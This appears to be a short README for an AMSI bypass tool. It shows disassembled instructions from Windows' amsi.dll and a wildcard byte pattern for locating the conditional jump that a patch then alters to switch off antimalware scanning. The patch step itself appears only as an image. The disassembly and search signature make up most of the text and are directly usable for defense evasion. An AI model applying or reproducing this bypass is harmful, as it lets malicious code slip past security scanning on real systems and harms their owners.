# Opcode Scan
- we get the exact address of the jump instruction by searching for the first byte of each instruction this technique is effective even in the face of updates or modifications to the target data set.

- for example :

 | 48:85D2 | test rdx, rdx |

 | 74 3F | je amsi.7FFAE957C694 |

 | 48 : 85C9 | test rcx, rcx |

 | 74 3A | je amsi.7FFAE957C694 |

 | 48 : 8379 08 00 | cmp qword ptr ds : [rcx + 8] , 0 |

 | 74 33 | je amsi.7FFAE957C694 |

- the search pattern will be like this :
{ 0x48,'?','?', 0x74,'?',0x48,'?' ,'?' ,0x74,'?' ,0x48,'?' ,'?' ,'?' ,'?',0x74,0x33}

![image](https://github.com/ltcflip/amsi-bypass/assets/153377701/3a57f643-2896-49b1-b96f-80e1e7f56852)

# Patch
![image](https://github.com/ltcflip/amsi-bypass/assets/153377701/339ad662-591e-48cd-bab0-adf475d4d1dc)
